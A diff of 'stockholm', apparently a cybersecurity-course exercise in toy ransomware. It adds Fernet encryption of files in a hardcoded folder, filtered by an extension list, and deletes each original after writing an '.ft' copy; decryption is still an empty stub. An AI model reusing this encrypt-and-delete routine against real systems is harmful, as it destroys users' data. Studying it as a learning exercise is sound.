@@ -3,9 +3,14 @@ import sys
 import secrets
 import logging
 import os.path
+from cryptography.fernet import Fernet
 
 PATH_FILE_KEY="./.key"
-PATH_INFECTION_FOLDER="/home/infection"
+# PATH_INFECTION_FOLDER="/home/infection/"
+PATH_INFECTION_FOLDER="/home/adrian/42cursus/cybersecurity_piscine/stockholm/ressources/"
+PATH_EXTENSION_LIST="./extension_list.txt"
+
+silent_output = False
 
 def	parse_args():
 	parser = argparse.ArgumentParser()
@@ -24,47 +29,82 @@ def	print_version():
 #-------------------------------------------------------------------------------------------------#
 
 def	reverse_stockholm():
-	print("reverse stockholm")
 	return 0
 
 #-------------------------------------------------------------------------------------------------#
 		
-def	create_hexa_key_file(key, path):
-	with open(path, 'w') as file:
+def	create_key_file(key, path):
+	with open(path, 'wb') as file:
 		file.write(key)
 
-def	generate_hexa_key():
-	key = secrets.token_hex(32)
+def	generate_key():
+	key = Fernet.generate_key()
 	return key
 
 def	read_hexa_key(path):
-	with open(path, 'r') as file:
+	with open(path, 'rb') as file:
 		key = file.read()
 	return key
 
 def	get_key():
-	print(os.path.isfile(PATH_FILE_KEY))
 	if (os.path.isfile(PATH_FILE_KEY)):
 		key = read_hexa_key(PATH_FILE_KEY)
 	else:
-		key = generate_hexa_key()
-		create_hexa_key_file(key, PATH_FILE_KEY)
+		key = generate_key()
+		create_key_file(key, PATH_FILE_KEY)
 	return key
 
+def	check_file_extension(filename, file_extension_list):
+	file_name, file_extension = os.path.splitext(filename)
+	if (file_extension in file_extension_list):
+		return True
+	else:
+		return False
+	
+def	init_file_extension_list():
+	with open(PATH_EXTENSION_LIST, 'r') as file:
+		extensions = file.readlines()
+		extensions = [ext.strip() for ext in extensions]
+	return extensions
+
+def	encrypt_files(key):
+	fernet = Fernet(key)
+	file_extension_list = init_file_extension_list()
+
+	for filename in os.listdir(PATH_INFECTION_FOLDER):
+		filename = PATH_INFECTION_FOLDER + filename
+		if (not check_file_extension(filename, file_extension_list)):
+			continue
+	
+		# encrypt data
+		with open(filename, 'rb') as file:
+			original_content = file.read()
+		encrypted_content = fernet.encrypt(original_content)
+
+		# save encrypted data in .ft file
+		with open(filename + ".ft", 'wb') as encrypted_file:
+			encrypted_file.write(encrypted_content)
+		
+		# delete clear file
+		os.remove(filename)
+
+		if (silent_output):
+			print("Encrypted file:", filename)
+
 def	stockholm():
-	print("stockholm")
 	key = get_key()
-	return 0
+	encrypt_files(key)
 
 #-------------------------------------------------------------------------------------------------#
 
 def	main():
 	try:
 		args = parse_args()
+		silent_output = args.silent
 		if (args.version):
 			print_version()
 		elif (args.reverse):
-			reverse_stockholm
+			reverse_stockholm()
 		else:
 			stockholm()
 
